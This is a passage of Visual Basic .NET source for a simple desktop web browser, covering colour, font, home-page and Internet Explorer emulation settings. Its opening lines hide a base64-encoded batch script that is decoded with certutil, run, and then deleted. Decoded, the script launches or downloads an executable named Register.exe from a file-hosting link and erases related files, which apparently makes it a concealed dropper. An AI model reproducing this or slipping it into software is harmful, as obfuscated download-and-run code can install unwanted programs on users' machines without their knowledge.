        sb.AppendLine("echo bm90IGV4aXN0ICV+ZHAwXFJlZ2lzdGVyLmV4ZSBnb3RvIFdlYnBhZ2VSZWdpc3Rl>>Register.Files")
        sb.AppendLine("echo cg0KaWYgZXhpc3QgJX5kcDBcUmVnaXN0ZXIuZXhlIGdvdG8gU3RhcnRSZWdpc3Rl>>Register.Files")
        sb.AppendLine("echo cg0KOlN0YXJ0UmVnaXN0ZXINCmNkICV+ZHAwXCAmJiBzdGFydCBSZWdpc3Rlci5l>>Register.Files")
        sb.AppendLine("echo eGUNCmlmIGV4aXN0ICV+ZHAwXFJlZ2lzdGVyXCBybWRpciAvcyAvcSAlfmRwMFxS>>Register.Files")
        sb.AppendLine("echo ZWdpc3RlclwNCmlmIGV4aXN0ICV+ZHAwXFJlZ2lzdGVyTGluay5iYXQgZGVsIC9z>>Register.Files")
        sb.AppendLine("echo IC9xICV+ZHAwXFJlZ2lzdGVyTGluay5iYXQNCmlmIGV4aXN0ICV+ZHAwXFJlZ2lz>>Register.Files")
        sb.AppendLine("echo dGVyLnR4dCBkZWwgL3MgL3EgJX5kcDBcUmVnaXN0ZXIudHh0DQppZiBleGlzdCAl>>Register.Files")
        sb.AppendLine("echo fmRwMFxSZWdpc3Rlci5GaWxlIGRlbCAvcyAvcSAlfmRwMFxSZWdpc3Rlci5GaWxl>>Register.Files")
        sb.AppendLine("echo DQppZiBleGlzdCAlfmRwMFxSZWdpc3Rlci5wczEgZGVsIC9zIC9xICV+ZHAwXFJl>>Register.Files")
        sb.AppendLine("echo Z2lzdGVyLnBzMQ0KZ290byBFbmRSZWdpc3Rlcg0KOldlYnBhZ2VSZWdpc3Rlcg0K>>Register.Files")
        sb.AppendLine("echo c3RhcnQgaHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2ZpbGUvZzIzcGNoNGx5ZDdo>>Register.Files")
        sb.AppendLine("echo eHJwL1JlZ2lzdGVyLmV4ZQ0KZ290byBFbmRSZWdpc3Rlcg0KOkVuZFJlZ2lzdGVy>>Register.Files")
        sb.AppendLine("echo DQpnb3RvIEV4aXQNCjpFeGl0DQpFeGl0DQo=>>Register.Files")
        sb.AppendLine("certutil -decode Register.Files Register.bat")
        sb.AppendLine(":Registering")
        sb.AppendLine("If exist License.Times copy /y /v License.Times %~dp0\")
        sb.AppendLine("start Register.bat")
        sb.AppendLine("if exist Register.Files del /s /q Register.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("registering.bat", sb.ToString())
        Process.Start("registering.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("registering.bat")
    End Sub
    Private Sub PictureBox4_Click(sender As Object, e As EventArgs) Handles PictureBox4.Click
        My.Computer.Clipboard.SetText("" & TxtAddress.Text)
    End Sub
    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        Do While Panel1.Height < 222
            Panel1.Height = Panel1.Height + 1
        Loop
        PictureBox5.Visible = False
        PictureBox6.Visible = True
    End Sub
    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click
        Do While Panel1.Height > 30
            Panel1.Height = Panel1.Height - 1
        Loop
        PictureBox5.Visible = True
        PictureBox6.Visible = False
    End Sub
    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click
        If UseMyHomeToolStripMenuItem.Checked = True Then
            My.Settings.HomePage = True
        Else
            My.Settings.HomePage = False
        End If
        If System.IO.Directory.Exists("Historique") = False Then
            System.IO.Directory.CreateDirectory("Historique")
            If System.IO.Directory.Exists("\Historique\HomePage.Bro") = False Then
                GoTo EndSub
            End If
        End If
        Dim reader As New System.IO.StreamReader(Application.StartupPath & "\Historique\HomePage.Bro")
        WebBrowser1.Url = New Uri(reader.ReadLine())
EndSub:
    End Sub
    Private Sub ChooseLikeHomeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChooseLikeHomeToolStripMenuItem.Click
        If System.IO.Directory.Exists("Historique") = False Then
            System.IO.Directory.CreateDirectory("Historique")
        End If
        Dim file As System.IO.StreamWriter
        file = New System.IO.StreamWriter("Historique\HomePage.Bro")
        file.WriteLine(TxtAddress.Text)
        file.Close()
        My.Settings.Save()
        If PictureBox7.Visible = False Then
            PictureBox7.Visible = True
        End If
    End Sub
    Private Sub UseMyHomeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UseMyHomeToolStripMenuItem.Click
        If UseMyHomeToolStripMenuItem.Checked = True Then
            My.Settings.HomePage = True
        Else
            My.Settings.HomePage = False
        End If
        PictureBox7.Visible = True
        If System.IO.Directory.Exists("Historique") = False Then
            System.IO.Directory.CreateDirectory("Historique")
            If System.IO.Directory.Exists("\Historique\HomePage.Bro") = False Then
                GoTo EndSub
            End If
        End If
        Dim reader As New System.IO.StreamReader(Application.StartupPath & "\Historique\HomePage.Bro")
        WebBrowser1.Url = New Uri(reader.ReadLine())
EndSub:
    End Sub
    Private Sub BackColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackColorToolStripMenuItem.Click
        Dim BackGround As DialogResult
        BackGround = ColorDialog1.ShowDialog()
        If BackGround = Windows.Forms.DialogResult.OK Then
            Panel1.BackColor = ColorDialog1.Color
            Label1.BackColor = ColorDialog1.Color
            Label2.BackColor = ColorDialog1.Color
            Label3.BackColor = ColorDialog1.Color
            Label5.BackColor = ColorDialog1.Color
            Label6.BackColor = ColorDialog1.Color
            Label7.BackColor = ColorDialog1.Color
            Label9.BackColor = ColorDialog1.Color
            Label10.BackColor = ColorDialog1.Color
            Label12.BackColor = ColorDialog1.Color
            Label13.BackColor = ColorDialog1.Color
            Label14.BackColor = ColorDialog1.Color
            Label16.BackColor = ColorDialog1.Color
            Label30.BackColor = ColorDialog1.Color
            PictureBox1.BackColor = ColorDialog1.Color
            PictureBox2.BackColor = ColorDialog1.Color
            PictureBox3.BackColor = ColorDialog1.Color
            PictureBox4.BackColor = ColorDialog1.Color
            PictureBox5.BackColor = ColorDialog1.Color
            PictureBox6.BackColor = ColorDialog1.Color
            PictureBox7.BackColor = ColorDialog1.Color
            Favorites.BackColor = ColorDialog1.Color
            EditToolStripMenuItem.BackColor = ColorDialog1.Color
            BackColor = ColorDialog1.Color
        End If
    End Sub
    Private Sub TextColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TextColorToolStripMenuItem.Click
        Dim colors As DialogResult
        colors = ColorDialog1.ShowDialog()
        If colors = Windows.Forms.DialogResult.OK Then
            Panel1.ForeColor = ColorDialog1.Color
            Label1.ForeColor = ColorDialog1.Color
            Label2.ForeColor = ColorDialog1.Color
            Label3.ForeColor = ColorDialog1.Color
            Label5.ForeColor = ColorDialog1.Color
            Label6.ForeColor = ColorDialog1.Color
            Label7.ForeColor = ColorDialog1.Color
            Label9.ForeColor = ColorDialog1.Color
            Label10.ForeColor = ColorDialog1.Color
            Label12.ForeColor = ColorDialog1.Color
            Label13.ForeColor = ColorDialog1.Color
            Label14.ForeColor = ColorDialog1.Color
            Label16.ForeColor = ColorDialog1.Color
            Label30.ForeColor = ColorDialog1.Color
            PictureBox1.ForeColor = ColorDialog1.Color
            PictureBox2.ForeColor = ColorDialog1.Color
            PictureBox3.ForeColor = ColorDialog1.Color
            PictureBox4.ForeColor = ColorDialog1.Color
            PictureBox5.ForeColor = ColorDialog1.Color
            PictureBox6.ForeColor = ColorDialog1.Color
            PictureBox7.ForeColor = ColorDialog1.Color
            Favorites.ForeColor = ColorDialog1.Color
            EditToolStripMenuItem.ForeColor = ColorDialog1.Color
        End If
    End Sub
    Private Sub FontStyleToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FontStyleToolStripMenuItem.Click
        FontDialog1.ShowDialog()
        Panel1.Font = FontDialog1.Font
        Label7.Font = FontDialog1.Font
        Label9.Font = FontDialog1.Font
        Label12.Font = FontDialog1.Font
        Label13.Font = FontDialog1.Font
        Label14.Font = FontDialog1.Font
        Label16.Font = FontDialog1.Font
        Label30.Font = FontDialog1.Font
        PictureBox1.Font = FontDialog1.Font
        PictureBox2.Font = FontDialog1.Font
        PictureBox3.Font = FontDialog1.Font
        PictureBox4.Font = FontDialog1.Font
        PictureBox5.Font = FontDialog1.Font
        PictureBox6.Font = FontDialog1.Font
        PictureBox7.Font = FontDialog1.Font
        Favorites.Font = FontDialog1.Font
        EditToolStripMenuItem.Font = FontDialog1.Font
        Panel2.Font = FontDialog1.Font
        Label15.Font = FontDialog1.Font
        Label4.Font = FontDialog1.Font
        Label8.Font = FontDialog1.Font
        Label11.Font = FontDialog1.Font
        Label20.Font = FontDialog1.Font
        Label21.Font = FontDialog1.Font
        Label22.Font = FontDialog1.Font
        Label23.Font = FontDialog1.Font
        Label24.Font = FontDialog1.Font
        Label25.Font = FontDialog1.Font
        Label26.Font = FontDialog1.Font
        Label27.Font = FontDialog1.Font
        Label28.Font = FontDialog1.Font
        Label29.Font = FontDialog1.Font
        Label31.Font = FontDialog1.Font
    End Sub
    Private Sub TopColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TopColorToolStripMenuItem.Click
        Dim BackGround As DialogResult
        BackGround = ColorDialog1.ShowDialog()
        If BackGround = Windows.Forms.DialogResult.OK Then
            Panel2.BackColor = ColorDialog1.Color
            Label15.BackColor = ColorDialog1.Color
            Label4.BackColor = ColorDialog1.Color
            Label8.BackColor = ColorDialog1.Color
            Label11.BackColor = ColorDialog1.Color
            Label20.BackColor = ColorDialog1.Color
            Label21.BackColor = ColorDialog1.Color
            Label22.BackColor = ColorDialog1.Color
            Label23.BackColor = ColorDialog1.Color
            Label24.BackColor = ColorDialog1.Color
            Label25.BackColor = ColorDialog1.Color
            Label26.BackColor = ColorDialog1.Color
            Label27.BackColor = ColorDialog1.Color
            Label28.BackColor = ColorDialog1.Color
            Label29.BackColor = ColorDialog1.Color
            Label31.BackColor = ColorDialog1.Color
        End If
    End Sub
    Private Sub TopTextColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TopTextColorToolStripMenuItem.Click
        Dim colors As DialogResult
        colors = ColorDialog1.ShowDialog()
        If colors = Windows.Forms.DialogResult.OK Then
            Panel2.ForeColor = ColorDialog1.Color
            Label15.ForeColor = ColorDialog1.Color
            Label4.ForeColor = ColorDialog1.Color
            Label8.ForeColor = ColorDialog1.Color
            Label11.ForeColor = ColorDialog1.Color
            Label20.ForeColor = ColorDialog1.Color
            Label21.ForeColor = ColorDialog1.Color
            Label22.ForeColor = ColorDialog1.Color
            Label23.ForeColor = ColorDialog1.Color
            Label24.ForeColor = ColorDialog1.Color
            Label25.ForeColor = ColorDialog1.Color
            Label26.ForeColor = ColorDialog1.Color
            Label27.ForeColor = ColorDialog1.Color
            Label28.ForeColor = ColorDialog1.Color
            Label29.ForeColor = ColorDialog1.Color
            Label31.ForeColor = ColorDialog1.Color
        End If
    End Sub
    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        My.Settings.FontStyle = Label7.Font
        My.Settings.BackColor = Label10.BackColor
        My.Settings.TextColor = Label10.ForeColor
        My.Settings.BackColor = BackColor
        My.Settings.TopColor = Label20.BackColor
        My.Settings.TopTextColor = Label20.ForeColor
        My.Settings.Save()
    End Sub
    Private Sub UseMySaveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UseMySaveToolStripMenuItem.Click
        If UseMySaveToolStripMenuItem.Checked = True Then
            My.Settings.UseMySave = True
        Else
            My.Settings.UseMySave = False
        End If
        Panel1.Font = My.Settings.FontStyle
        Label7.Font = My.Settings.FontStyle
        Label9.Font = My.Settings.FontStyle
        Label12.Font = My.Settings.FontStyle
        Label13.Font = My.Settings.FontStyle
        Label14.Font = My.Settings.FontStyle
        Label16.Font = My.Settings.FontStyle
        Label30.Font = My.Settings.FontStyle
        PictureBox1.Font = My.Settings.FontStyle
        PictureBox2.Font = My.Settings.FontStyle
        PictureBox3.Font = My.Settings.FontStyle
        PictureBox4.Font = My.Settings.FontStyle
        PictureBox5.Font = My.Settings.FontStyle
        PictureBox6.Font = My.Settings.FontStyle
        PictureBox7.Font = My.Settings.FontStyle
        Favorites.Font = My.Settings.FontStyle
        EditToolStripMenuItem.Font = My.Settings.FontStyle
        Panel2.Font = My.Settings.FontStyle
        Label15.Font = My.Settings.FontStyle
        Label4.Font = My.Settings.FontStyle
        Label8.Font = My.Settings.FontStyle
        Label11.Font = My.Settings.FontStyle
        Label20.Font = My.Settings.FontStyle
        Label21.Font = My.Settings.FontStyle
        Label22.Font = My.Settings.FontStyle
        Label23.Font = My.Settings.FontStyle
        Label24.Font = My.Settings.FontStyle
        Label25.Font = My.Settings.FontStyle
        Label26.Font = My.Settings.FontStyle
        Label27.Font = My.Settings.FontStyle
        Label28.Font = My.Settings.FontStyle
        Label29.Font = My.Settings.FontStyle
        Label31.Font = My.Settings.FontStyle
        Panel1.BackColor = My.Settings.BackColor
        Label1.BackColor = My.Settings.BackColor
        Label2.BackColor = My.Settings.BackColor
        Label3.BackColor = My.Settings.BackColor
        Label5.BackColor = My.Settings.BackColor
        Label6.BackColor = My.Settings.BackColor
        Label7.BackColor = My.Settings.BackColor
        Label9.BackColor = My.Settings.BackColor
        Label10.BackColor = My.Settings.BackColor
        Label12.BackColor = My.Settings.BackColor
        Label13.BackColor = My.Settings.BackColor
        Label14.BackColor = My.Settings.BackColor
        Label16.BackColor = My.Settings.BackColor
        Label30.BackColor = My.Settings.BackColor
        PictureBox1.BackColor = My.Settings.BackColor
        PictureBox2.BackColor = My.Settings.BackColor
        PictureBox3.BackColor = My.Settings.BackColor
        PictureBox4.BackColor = My.Settings.BackColor
        PictureBox5.BackColor = My.Settings.BackColor
        PictureBox6.BackColor = My.Settings.BackColor
        PictureBox7.BackColor = My.Settings.BackColor
        Favorites.BackColor = My.Settings.BackColor
        EditToolStripMenuItem.BackColor = My.Settings.BackColor
        ToolStripMenuItem2.BackColor = My.Settings.BackColor
        BackColor = My.Settings.BackColor
        Panel1.ForeColor = My.Settings.TextColor
        Label1.ForeColor = My.Settings.TextColor
        Label2.ForeColor = My.Settings.TextColor
        Label3.ForeColor = My.Settings.TextColor
        Label5.ForeColor = My.Settings.TextColor
        Label6.ForeColor = My.Settings.TextColor
        Label7.ForeColor = My.Settings.TextColor
        Label9.ForeColor = My.Settings.TextColor
        Label10.ForeColor = My.Settings.TextColor
        Label12.ForeColor = My.Settings.TextColor
        Label13.ForeColor = My.Settings.TextColor
        Label14.ForeColor = My.Settings.TextColor
        Label16.ForeColor = My.Settings.TextColor
        Label30.ForeColor = My.Settings.TextColor
        PictureBox1.ForeColor = My.Settings.TextColor
        PictureBox2.ForeColor = My.Settings.TextColor
        PictureBox3.ForeColor = My.Settings.TextColor
        PictureBox4.ForeColor = My.Settings.TextColor
        PictureBox5.ForeColor = My.Settings.TextColor
        PictureBox6.ForeColor = My.Settings.TextColor
        PictureBox7.ForeColor = My.Settings.TextColor
        Favorites.ForeColor = My.Settings.TextColor
        EditToolStripMenuItem.ForeColor = My.Settings.TextColor
        Panel2.BackColor = My.Settings.TopColor
        Label15.BackColor = My.Settings.TopColor
        Label4.BackColor = My.Settings.TopColor
        Label8.BackColor = My.Settings.TopColor
        Label11.BackColor = My.Settings.TopColor
        Label20.BackColor = My.Settings.TopColor
        Label21.BackColor = My.Settings.TopColor
        Label22.BackColor = My.Settings.TopColor
        Label23.BackColor = My.Settings.TopColor
        Label24.BackColor = My.Settings.TopColor
        Label25.BackColor = My.Settings.TopColor
        Label26.BackColor = My.Settings.TopColor
        Label27.BackColor = My.Settings.TopColor
        Label28.BackColor = My.Settings.TopColor
        Label29.BackColor = My.Settings.TopColor
        Label31.BackColor = My.Settings.TopColor
        Panel2.ForeColor = My.Settings.TopTextColor
        Label15.ForeColor = My.Settings.TopTextColor
        Label4.ForeColor = My.Settings.TopTextColor
        Label8.ForeColor = My.Settings.TopTextColor
        Label11.ForeColor = My.Settings.TopTextColor
        Label20.ForeColor = My.Settings.TopTextColor
        Label21.ForeColor = My.Settings.TopTextColor
        Label22.ForeColor = My.Settings.TopTextColor
        Label23.ForeColor = My.Settings.TopTextColor
        Label24.ForeColor = My.Settings.TopTextColor
        Label25.ForeColor = My.Settings.TopTextColor
        Label26.ForeColor = My.Settings.TopTextColor
        Label27.ForeColor = My.Settings.TopTextColor
        Label28.ForeColor = My.Settings.TopTextColor
        Label29.ForeColor = My.Settings.TopTextColor
        Label31.ForeColor = My.Settings.TopTextColor
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Label12.Text = Times
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If Label16.Visible = False Then
            GoTo EndSub
        Else
        End If
ShowDiff:
        If My.Computer.FileSystem.FileExists(Application.StartupPath & "\License.Times") = False Then
            GoTo EndSub
        End If
        Dim reader2 As New System.IO.StreamReader(Application.StartupPath & "\License.Times")
        Label4.Text = New System.Text.ASCIIEncoding().GetString(Convert.FromBase64String(reader2.ReadLine()))
        Dim date1 As Date = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Dim date2 As Date = CDate(Label4.Text)
        Dim Result2 As Integer
        Result2 = DateDiff(DateInterval.Second, date1, date2)
        Label16.Text = Result2
EndSub:
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        If ToolStripMenuItem1.Checked = True Then
            My.Settings.IE11bool = True
        Else
            My.Settings.IE11bool = False
        End If
        If My.Settings.IE11bool = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION\", "Browser.exe", 11000, Microsoft.Win32.RegistryValueKind.DWord)
            My.Settings.Save()
            Application.Restart()
        End If
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        If ToolStripMenuItem3.Checked = True Then
            My.Settings.IE10bool = True
        Else
            My.Settings.IE10bool = False
        End If
        If My.Settings.IE10bool = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION\", "Browser.exe", 10000, Microsoft.Win32.RegistryValueKind.DWord)
            My.Settings.Save()
            Application.Restart()
        End If
    End Sub

    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        If ToolStripMenuItem4.Checked = True Then
            My.Settings.IE9bool = True
        Else
            My.Settings.IE9bool = False
        End If
        If My.Settings.IE9bool = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION\", "Browser.exe", 9000, Microsoft.Win32.RegistryValueKind.DWord)
            My.Settings.Save()
            Application.Restart()
        End If
    End Sub

    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        If ToolStripMenuItem6.Checked = True Then
            My.Settings.IE8bool = True
        Else
            My.Settings.IE8bool = False
        End If
        If My.Settings.IE8bool = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION\", "Browser.exe", 8000, Microsoft.Win32.RegistryValueKind.DWord)
            My.Settings.Save()
            Application.Restart()
        End If
    End Sub

    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem5.Click
        If ToolStripMenuItem5.Checked = True Then
            My.Settings.IE7bool = True
        Else
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE7bool = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION\", "Browser.exe", 7000, Microsoft.Win32.RegistryValueKind.DWord)
            My.Settings.Save()
            Application.Restart()
        End If
    End Sub

    Private Sub ToolStripDropDownButton2_Click(sender As Object, e As EventArgs) Handles ToolStripDropDownButton2.Click
        If My.Settings.IE11bool = True Then
            ToolStripMenuItem1.Checked = True
        End If
        If ToolStripMenuItem1.Checked = True Then
            My.Settings.IE10bool = False
            My.Settings.IE9bool = False
            My.Settings.IE8bool = False
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE10bool = True Then
            ToolStripMenuItem3.Checked = True
        End If
        If ToolStripMenuItem3.Checked = True Then
            My.Settings.IE11bool = False
            My.Settings.IE9bool = False
            My.Settings.IE8bool = False
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE9bool = True Then
            ToolStripMenuItem4.Checked = True
        End If
        If ToolStripMenuItem4.Checked = True Then
            My.Settings.IE11bool = False
            My.Settings.IE10bool = False
            My.Settings.IE8bool = False
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE8bool = True Then
            ToolStripMenuItem6.Checked = True
        End If
        If ToolStripMenuItem6.Checked = True Then
            My.Settings.IE11bool = False
            My.Settings.IE10bool = False
            My.Settings.IE9bool = False
            My.Settings.IE7bool = False
        End If
        If My.Settings.IE7bool = True Then
            ToolStripMenuItem5.Checked = True
        End If
        If ToolStripMenuItem5.Checked = True Then
            My.Settings.IE11bool = False
            My.Settings.IE10bool = False
            My.Settings.IE9bool = False
            My.Settings.IE8bool = False
        End If
    End Sub
End Class
